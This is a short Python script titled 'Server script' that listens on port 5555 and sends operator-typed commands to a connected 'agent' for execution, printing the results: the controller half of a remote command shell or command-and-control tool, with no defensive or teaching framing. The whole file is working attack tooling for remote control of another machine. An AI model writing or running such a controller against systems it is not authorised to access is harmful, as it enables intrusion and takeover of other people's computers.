# Server script

import socket

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5555



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print("[+] Listening for incoming connections")

while True:
    client_socket, client_address = s.accept()
    print(f"[+] Accepted connection from {client_address}")
    print(client_socket.recv(1024).decode())


    while True:
        command = input("Enter command to execute on agent (type 'exit' to quit): ").strip()
        if command.lower() == "exit":
            client_socket.send("exit".encode())
            client_socket.close()
            break

        client_socket.send(command.encode())
        result = client_socket.recv(1024).decode()
        print(result)

    input()
    break
            
